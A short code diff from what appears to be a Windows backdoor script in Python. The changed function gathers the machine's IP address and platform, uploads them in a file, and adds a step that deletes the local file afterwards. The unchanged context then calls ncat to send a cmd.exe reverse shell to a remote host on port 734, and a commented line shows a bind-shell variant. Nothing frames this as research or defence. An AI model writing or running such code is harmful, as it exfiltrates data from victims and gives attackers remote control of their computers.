@@ -64,7 +64,8 @@ def run():
         print('Address ip: ', IPAddr)
         stmnt= 'Info: '+ IPAddr+'    |   '+sysconfig.get_platform()
         create_file("data.txt",stmnt)
-        subir_archivo('info.txt', stmnt )
+        subir_archivo('data.txt', stmnt )
+        delete_file("data.txt")
         
         #os.system('ncat -lvp 734 -e cmd.exe')
         os.system('ncat '+ iph +' 734 -e cmd.exe')
